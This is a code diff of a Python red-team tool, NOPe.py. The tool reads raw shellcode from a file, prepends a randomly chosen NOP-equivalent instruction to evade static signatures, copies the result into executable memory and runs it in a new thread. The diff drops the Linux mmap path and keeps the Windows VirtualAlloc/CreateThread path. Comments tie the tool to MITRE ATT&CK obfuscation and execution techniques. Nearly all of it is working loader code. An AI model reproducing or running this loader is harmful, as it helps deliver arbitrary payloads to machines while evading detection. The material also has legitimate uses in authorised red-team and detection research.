@@ -1,13 +1,11 @@
-# File: unix_NOPe.py
-# Purpose: Utility to prepend a randomized NOP sled to arbitrary shellcode and execute it in memory.
-# Red Team Tradecraft: Implements code obfuscation (MITRE ATT&CK T1027) and in-memory execution (T1059) to evade static analysis and detection.
-import argparse
+# File: NOPe.py
+# Purpose: Utility to prepend randomized NOP sleds to shellcode and execute it in memory.
+# Red Team Tradecraft: Implements obfuscation (MITRE ATT&CK T1027) and in-memory execution (T1059).
 import ctypes
-import mmap
-import os
-import platform
 import random
+import argparse
 import sys
+
 
 X64_NOPS = {
     b"\x90": "NOP (single byte, standard NOP instruction)",
@@ -45,6 +43,7 @@ X64_NOPS = {
     b"\x75\x00": "JNZ SHORT $+2 (conditional jump NOP)",
     b"\x74\x00": "JZ SHORT $+2 (jump-based NOP)",
 }
+
 X86_NOPS = {
     b"\x90": "NOP (single byte, standard NOP instruction)",
     b"\x66\x90": "NOP (two-byte variant, used for instruction alignment)",
@@ -77,88 +76,56 @@ X86_NOPS = {
     b"\x26\x90": "ES: NOP (Acts as a standard NOP)",
     b"\xEB\x00": "JMP SHORT $+2 (Jumps to next instruction, wasting cycles)",
     b"\x75\x00": "JNZ SHORT $+2 (Conditional jump that has no real effect)",
-    b"\x74\x00": "JZ SHORT $+2 (Another jump-based NOP, good for obfuscation)",
+    b"\x74\x00": "JZ SHORT $+2 (Another jump-based NOP, good for obfuscation)"
+
 }
 
+
 # Function: execute_shellcode
-# Description: Reads raw shellcode from disk, prepends a randomized NOP variant for obfuscation,
-#              allocates executable memory, and transfers execution to the modified payload.
-# Red Team Tradecraft: Evades static analysis through random NOP sleds (T1027) and leverages in-memory code execution (T1059).
+# Description: Reads raw shellcode, prepends a randomized NOP variant for obfuscation,
+#              allocates executable memory, and transfers execution to the payload.
+# Red Team Tradecraft: Evades static analysis through randomized NOP sleds (T1027) and leverages in-memory execution (T1059).
 def execute_shellcode(shellcode_file: str, arch: str, verbose: bool = False) -> None:
-    """Load and execute shellcode with a random NOP for a given architecture,
-    using Windows APIs on NT and POSIX mmap/libc on other systems."""
-    # Read in the raw shellcode bytes
+    """Load and execute shellcode with a random NOP for a given architecture."""
     with open(shellcode_file, 'rb') as f:
         shellcode_bytes = f.read()
 
-    # Pick a random prepended NOP
     nops = X64_NOPS if arch == "x64" else X86_NOPS
     nop_bytes, desc = random.choice(list(nops.items()))
-    payload = nop_bytes + shellcode_bytes
 
     if verbose:
-        print(f"[+] Platform: {platform.system()}")
         print(f"[+] Selected architecture: {arch}")
         print(f"[+] NOP used: {desc} ({nop_bytes.hex()})")
-        print(f"[+] Total payload size: {len(payload)} bytes")
+        print(f"[+] Shellcode size (before NOP): {len(shellcode_bytes)}")
 
-    system = platform.system()
-    if system == "Windows":
-        kernel32 = ctypes.windll.kernel32
-        kernel32.VirtualAlloc.restype = ctypes.c_void_p
-        kernel32.CreateThread.argtypes = (
-            ctypes.c_int, ctypes.c_int, ctypes.c_void_p,
-            ctypes.c_int, ctypes.c_int, ctypes.POINTER(ctypes.c_int)
-        )
+    payload = nop_bytes + shellcode_bytes
 
-        # Allocate RWX memory
-        alloc = kernel32.VirtualAlloc(
-            None, len(payload),
-            0x3000,        # MEM_COMMIT | MEM_RESERVE
-            0x40           # PAGE_EXECUTE_READWRITE
-        )
-        if not alloc:
-            raise ctypes.WinError()
+    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
+    ctypes.windll.kernel32.CreateThread.argtypes = (
+        ctypes.c_int, ctypes.c_int, ctypes.c_void_p, ctypes.c_int,
+        ctypes.c_int, ctypes.POINTER(ctypes.c_int)
+    )
 
-        # Copy in the shellcode
-        buf = (ctypes.c_char * len(payload)).from_buffer_copy(payload)
-        kernel32.RtlMoveMemory(ctypes.c_void_p(alloc), buf, len(payload))
+    allocation = ctypes.windll.kernel32.VirtualAlloc(
+        0, len(payload), 0x3000, 0x40
+    )
 
-        # Execute in a new thread and wait
-        thread_handle = kernel32.CreateThread(
-            None, 0,
-            ctypes.c_void_p(alloc),
-            None, 0,
-            ctypes.pointer(ctypes.c_int(0))
-        )
-        kernel32.WaitForSingleObject(thread_handle, 0xFFFFFFFF)
+    buffer = (ctypes.c_char * len(payload)).from_buffer_copy(payload)
 
-    else:
-        # -- POSIX path via mmap + libc --
-        size = len(payload)
-        # mmap an anonymous RWX region
-        mem = mmap.mmap(
-            -1, size,
-            prot=mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC,
-            flags=mmap.MAP_PRIVATE | mmap.MAP_ANONYMOUS
-        )
-        # write the payload in
-        mem.write(payload)
+    ctypes.windll.kernel32.RtlMoveMemory(
+        ctypes.c_void_p(allocation), buffer, len(payload)
+    )
 
-        # get a void* pointer to the mmap buffer
-        addr = ctypes.addressof(ctypes.c_char.from_buffer(mem))
+    thread_handle = ctypes.windll.kernel32.CreateThread(
+        0, 0, ctypes.c_void_p(allocation), 0, 0, ctypes.pointer(ctypes.c_int(0))
+    )
 
-        # on Linux/UNIX we can just cast to a function and call it
-        shellfunc = ctypes.CFUNCTYPE(None)(addr)
-        shellfunc()
-
-        # cleanup (optional)
-        mem.close()
+    ctypes.windll.kernel32.WaitForSingleObject(thread_handle, 0xFFFFFFFF)
 
 
 # Function: list_nops
-# Description: Enumerates all supported NOP instruction variants for the chosen architecture,
-#              helping operators understand available obfuscation primitives.
+# Description: Enumerates supported NOP variants for the selected architecture to inform payload crafting.
+# Red Team Tradecraft: Supports obfuscation strategy planning and minimal footprint discovery (T1027).
 def list_nops(arch: str) -> None:
     """List all supported NOP instructions for the selected architecture."""
     print(f"\nSupported NOP instructions for architecture: {arch.upper()}")
@@ -169,12 +136,14 @@ def list_nops(arch: str) -> None:
 
 
 # Function: main
-# Description: Parses command-line arguments and orchestrates script behavior for listing NOPs or executing payloads, providing a unified operator interface.
+# Description: Parses CLI arguments and routes to listing or execution workflows, providing a unified operator interface.
+# Red Team Tradecraft: Streamlines payload deployment workflows, enhancing OPSEC agility.
 def main():
     parser = argparse.ArgumentParser(
-        description="Execute shellcode with a random prepended NOP (x86 or x64).",
+        description="Execute shellcode with random prepended NOP (x86 or x64).",
         epilog="Example: python3 NOPe.py -f payload.bin --arch x64"
     )
+
     parser.add_argument(
         "-f", "--file", default="msgbox.x64.bin",
         help="Path to shellcode file (.bin)"
